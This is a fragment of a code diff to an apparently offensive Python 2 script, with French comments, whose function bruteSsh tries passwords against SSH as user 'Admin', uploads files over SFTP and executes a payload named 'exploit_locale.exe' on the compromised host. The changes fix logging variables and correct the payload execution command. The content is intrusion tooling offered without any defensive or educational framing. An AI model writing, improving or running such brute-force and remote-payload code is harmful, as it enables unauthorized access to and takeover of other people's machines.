@@ -209,14 +209,13 @@ def bruteSsh(ip): #BruteForce SSH + envoi de binaires + execution + récupérati
 			
 		try:
 			ssh.connect(ip,port=22,username="Admin",password=password)
-			print "[*] SSH IP: %s Password found: %s\n" % (current_target,password)
+			print "[*] SSH IP: %s Password found: %s\n" % (ip,password)
 		except paramiko.AuthenticationException:
-			print "[*] SSH IP: %s Password failed: %s" % (current_target,password)
+			print "[*] SSH IP: %s Password failed: %s" % (ip,password)
 			continue
 			
 		try:
 			transport = paramiko.Transport((ip, 22))
-			print password
 			transport.connect(username = 'Admin', password = password)
 			sftp = paramiko.SFTPClient.from_transport(transport)
 		except:
@@ -228,7 +227,8 @@ def bruteSsh(ip): #BruteForce SSH + envoi de binaires + execution + récupérati
 			print "[*] erreur lors du transfert sftp"
 			break
 		try:
-			stdin, stdout, stderr = ssh.exec_command('./home/Admin/Desltop/exploit_locale.exe')
+     			print 'execution du payload'
+			stdin, stdout, stderr = ssh.exec_command('cd /home/Admin/Desktop/ && ./exploit_locale.exe')
 			time.sleep(5)
 		except:
 			print "[*] erreur lors de l'execution du payload"
